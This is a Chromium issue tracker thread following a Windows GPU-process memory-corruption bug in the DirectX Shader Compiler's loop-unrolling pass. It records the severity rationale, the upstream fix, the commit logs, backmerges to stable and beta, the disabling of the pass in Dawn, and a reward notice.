Update: I've been investigating this one for days. I finally narrowed it down to a buggy IR pass added by Microsoft to DXC for loop unrolling. I put up a candidate CL that disables this pass: <https://dawn-review.googlesource.com/c/dawn/+/184422>.
With this change, Chrome no longer creashes when loading `indexCarefully2.html` (attached to the bug).

### ad...@google.com (2024-04-19)

Thanks for the update amaiorano@ - once this lands please mark this as Fixed so that merge processes kick off.

A note on the rationale for the S1 severity here, because I had to think about it: GPU process bugs, directly exploitable from web content like this one, are usually S0 because the GPU process is not sandboxed on all platforms. However this is Windows-specific and we do have a lot of trust in the Windows GPU process sandbox, so S1 is correct in this case.

### am...@google.com (2024-04-19)

Update: I sent an email to Microsft folks about this bug, and they sent me a patch that fixes the bug in DXC. They will take care of landing this patch upstream, so I'm waiting for that to happen before marking this as fixed.

### am...@google.com (2024-04-23)

- Patch has [landed upstream](https://github.com/microsoft/DirectXShaderCompiler/commit/4242b576ed109e0bb6fd87f70823f8dd40f0fd2c).
- The patch has [rolled into Dawn](https://dawn.googlesource.com/dawn/+/40dd39e66e2bd4f41bfce63e0bf202521451f212).
- Waiting for it to roll into Chrome, and will test in Canary (probably tomorrow)

### am...@google.com (2024-04-25)

I tested on Canary Version 126.0.6439.0 (Official Build) canary (64-bit) by loading `indexCarefully2.html` (attached to bug), and Chrome no longer crashes.

### am...@google.com (2024-04-25)

Let me know which release branches to cherry-pick to.

### pe...@google.com (2024-04-25)

This is sufficiently serious that it should be merged to stable. But I can't  see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M124. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
This is sufficiently serious that it should be merged to beta. But I can't  see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M125. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.


Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.


Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [124, 125].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


### am...@chromium.org (2024-04-25)

I've just reviewed Canary data since the Dawn roll landed on Chromium a couple of days ago. Please merge this fix to M125 Beta / branch 6422 and M124 Stable / branch 6367 NLT 10am Pacific time tomorrow, Friday 26 April

### ap...@google.com (2024-04-26)

Project: external/github.com/microsoft/DirectXShaderCompiler
Branch: refs/branch-heads/patches/6422

commit 00eb408e75ea8e86bffb6e0217afdcabf0af80e1
Author: Antonio Maiorano <amaiorano@google.com>
Date:   Thu Apr 25 16:56:46 2024

    Fixed crash in loop unroll caused by bug in structurize loop exits (#6548)
    
    Fixed a bug in `hlsl::RemoveUnstructuredLoopExits` where when a new
    exiting block is created from splitting, it was added to the current
    loop being processed, when it could also part of an inner loop. Not
    adding the new block to inner loops that it's part of makes the inner
    loops malformed, and causes crash.
    
    This fix adds the new block to the inner most loop that it should be
    part of. Also adds the `StructurizeLoopExits` option to `loop-unroll`
    pass, which was missing before.
    
    Bug: chromium:333508731
    Change-Id: I1b3ad580ab187ec92323369ffbe337ede39846e8
    Reviewed-on: https://chromium-review.googlesource.com/c/external/github.com/microsoft/DirectXShaderCompiler/+/5491021
    Reviewed-by: James Price <jrprice@google.com>
    Reviewed-by: Ben Clayton <bclayton@chromium.org>

M       lib/Transforms/Scalar/DxilRemoveUnstructuredLoopExits.cpp
M       lib/Transforms/Scalar/LoopUnrollPass.cpp
A       tools/clang/test/DXC/loop_structurize_exit_inner_latch_regression.ll
M       utils/hct/hctdb.py

https://chromium-review.googlesource.com/5491021


### ap...@google.com (2024-04-26)

Project: external/github.com/microsoft/DirectXShaderCompiler
Branch: refs/branch-heads/patches/6367

commit bd7aa97798735e1288d36de41dcda75e867550e4
Author: Antonio Maiorano <amaiorano@google.com>
Date:   Thu Apr 25 16:49:11 2024

    Fixed crash in loop unroll caused by bug in structurize loop exits (#6548)
    
    Fixed a bug in `hlsl::RemoveUnstructuredLoopExits` where when a new
    exiting block is created from splitting, it was added to the current
    loop being processed, when it could also part of an inner loop. Not
    adding the new block to inner loops that it's part of makes the inner
    loops malformed, and causes crash.
    
    This fix adds the new block to the inner most loop that it should be
    part of. Also adds the `StructurizeLoopExits` option to `loop-unroll`
    pass, which was missing before.
    
    Bug: chromium:333508731
    Change-Id: I7efc21bc61aeb81b4906a600c35272af232710ea
    Reviewed-on: https://chromium-review.googlesource.com/c/external/github.com/microsoft/DirectXShaderCompiler/+/5490380
    Reviewed-by: James Price <jrprice@google.com>
    Reviewed-by: Ben Clayton <bclayton@chromium.org>

M       lib/Transforms/Scalar/DxilRemoveUnstructuredLoopExits.cpp
M       lib/Transforms/Scalar/LoopUnrollPass.cpp
A       tools/clang/test/DXC/loop_structurize_exit_inner_latch_regression.ll
M       utils/hct/hctdb.py

https://chromium-review.googlesource.com/5490380


### am...@google.com (2024-04-26)

The fix has been merged to:

- M124: <https://chromium.googlesource.com/chromium/src.git/+/062e7a3b5f86ec92d664b0ec691362652c11573e>
- M125: <https://chromium.googlesource.com/chromium/src.git/+/6eac556f40c7e8795d1d1925a792dd575eb86b60>

### sp...@google.com (2024-05-02)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $10000.00 for this report.

Rationale for this decision:
GPU process memory corruption

Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. Two other things we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.
* If you are already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have already registered, there is no need to repeat the process and you’ll automatically be paid soon. If you have any payment related questions or issues, please reach out to p2p-vrp@google.com.

### ap...@google.com (2024-06-12)

Project: dawn
Branch: main

commit cb79ddf448252ae8d25b8f0cb4e3dc4d7b8f54fe
Author: Antonio Maiorano <amaiorano@google.com>
Date:   Wed Jun 12 00:37:29 2024

    dawn/dxc: disable DXC pass 'structurize-loop-exits-for-unroll'
    
    Multiple security bugs have been reported related to this optimization pass, and after careful consideration, we have decided to disable it.
    
    Bug: chromium:333508731
    Bug: chromium:339171223
    Bug: chromium:339169163
    Bug: chromium:346595893
    Change-Id: I5c9d7180ed09e7417c120595937bcb1013b6ce66
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/184422
    Commit-Queue: Antonio Maiorano <amaiorano@google.com>
    Reviewed-by: Natalie Chouinard <chouinard@google.com>
    Reviewed-by: Austin Eng <enga@chromium.org>

M       src/dawn/native/d3d/ShaderUtils.cpp

https://dawn-review.googlesource.com/184422


### ap...@google.com (2024-06-12)

Project: chromium/src
Branch: main

commit 7cb330156dcffbf97c3eda1aba1fb3606641e42b
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date:   Wed Jun 12 10:08:47 2024

    Roll Dawn from 6f5358203435 to 236295367f2e (16 revisions)
    
    https://dawn.googlesource.com/dawn.git/+log/6f5358203435..236295367f2e
    
    2024-06-12 dawn-autoroll@skia-public.iam.gserviceaccount.com Roll DirectX Shader Compiler from 0b9acdb75e17 to a44c88e2b803 (4 revisions)
    2024-06-12 dawn-autoroll@skia-public.iam.gserviceaccount.com Roll Depot Tools from e30d8fac3437 to fd8560139886 (6 revisions)
    2024-06-12 dsinclair@chromium.org [hlsl] Start emitting types and constants.
    2024-06-12 jrprice@google.com [tint] Remove clamping for textureStore
    2024-06-12 jrprice@google.com [msl] Emit `abs()` builtin
    2024-06-12 jrprice@google.com [msl] Add polyfill for textureStore()
    2024-06-12 jrprice@google.com [msl] Add polyfill for textureLoad()
    2024-06-12 hao.x.li@intel.com Add Intel Arrowlake and Battlemage device IDs
    2024-06-12 jiawei.shao@intel.com Disallow using `@blend_src` on a non-struct fragment output
    2024-06-12 dneto@google.com .gitignore: Ignore local files written by pyenv
    2024-06-12 amaiorano@google.com dawn/dxc: disable DXC pass 'structurize-loop-exits-for-unroll'
    2024-06-12 enga@chromium.org Remove obsolete TODO about future tracking
    2024-06-11 senorblanco@chromium.org CTS: widen some expectations on Linux.
    2024-06-11 dsinclair@chromium.org Cleanup clang-tidy issues in src/tint/api
    2024-06-11 dawn-autoroll@skia-public.iam.gserviceaccount.com Roll ANGLE from 81452425d73f to 544b108a1f77 (12 revisions)
    2024-06-11 dsinclair@chromium.org Update name of the disassembler
    
    If this roll has caused a breakage, revert this CL and stop the roller
    using the controls here:
    https://autoroll.skia.org/r/dawn-chromium-autoroll
    Please CC cwallez@google.com,senorblanco@google.com on the revert to ensure that a human
    is aware of the problem.
    
    To file a bug in Dawn: https://bugs.chromium.org/p/dawn/issues/entry
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry
    
    To report a problem with the AutoRoller itself, please file a bug:
    https://issues.skia.org/issues/new?component=1389291&template=1850622
    
    Documentation for the AutoRoller is here:
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md
    
    Cq-Include-Trybots: luci.chromium.try:dawn-android-arm-deps-rel;luci.chromium.try:dawn-android-arm64-deps-rel;luci.chromium.try:dawn-linux-x64-deps-rel;luci.chromium.try:dawn-mac-x64-deps-rel;luci.chromium.try:dawn-mac-arm64-deps-rel;luci.chromium.try:dawn-win10-x64-deps-rel;luci.chromium.try:dawn-win10-x86-deps-rel;luci.chromium.try:dawn-win11-arm64-deps-rel;luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:gpu-fyi-cq-android-arm64
    Bug: chromium:333508731,chromium:339169163,chromium:339171223,chromium:341973423,chromium:345480299,chromium:346595893,chromium:42251016,chromium:42251305
    Tbr: senorblanco@google.com
    Test: Test: tint_unittests
    Include-Ci-Only-Tests: true
    Change-Id: I0c94717b662d22ad005beb9e3fb1d86f4425cbd4
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5625269
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    Cr-Commit-Position: refs/heads/main@{#1313905}

M       DEPS
M       third_party/dawn

https://chromium-review.googlesource.com/5625269


### ap...@google.com (2024-06-17)

Project: dawn
Branch: chromium/6533

commit 41d4bdf93cbc8783699cc6f9d6a1b04fa056b662
Author: Antonio Maiorano <amaiorano@google.com>
Date:   Mon Jun 17 18:34:01 2024

    dawn/dxc: disable DXC pass 'structurize-loop-exits-for-unroll'
    
    Multiple security bugs have been reported related to this optimization pass, and after careful consideration, we have decided to disable it.
    
    Bug: chromium:333508731
    Bug: chromium:339171223
    Bug: chromium:339169163
    Bug: chromium:346595893
    Change-Id: I5c9d7180ed09e7417c120595937bcb1013b6ce66
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/184422
    Commit-Queue: Antonio Maiorano <amaiorano@google.com>
    Reviewed-by: Natalie Chouinard <chouinard@google.com>
    Reviewed-by: Austin Eng <enga@chromium.org>
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/193646
    Reviewed-by: dan sinclair <dsinclair@chromium.org>

M       src/dawn/native/d3d/ShaderUtils.cpp

https://dawn-review.googlesource.com/193646


### ap...@google.com (2024-06-17)

Project: dawn
Branch: chromium/6478

commit 9c6534f82db39148f29f0bb5e64fdcc7c2a4f372
Author: Antonio Maiorano <amaiorano@google.com>
Date:   Mon Jun 17 18:33:47 2024

    dawn/dxc: disable DXC pass 'structurize-loop-exits-for-unroll'
    
    Multiple security bugs have been reported related to this optimization pass, and after careful consideration, we have decided to disable it.
    
    Bug: chromium:333508731
    Bug: chromium:339171223
    Bug: chromium:339169163
    Bug: chromium:346595893
    Change-Id: I5c9d7180ed09e7417c120595937bcb1013b6ce66
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/184422
    Commit-Queue: Antonio Maiorano <amaiorano@google.com>
    Reviewed-by: Natalie Chouinard <chouinard@google.com>
    Reviewed-by: Austin Eng <enga@chromium.org>
    Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/194160
    Reviewed-by: dan sinclair <dsinclair@chromium.org>

M       src/dawn/native/d3d/ShaderUtils.cpp

https://dawn-review.googlesource.com/194160


### pe...@google.com (2024-08-02)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### al...@gmail.com (2024-11-16)

deleted

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/333508731)*
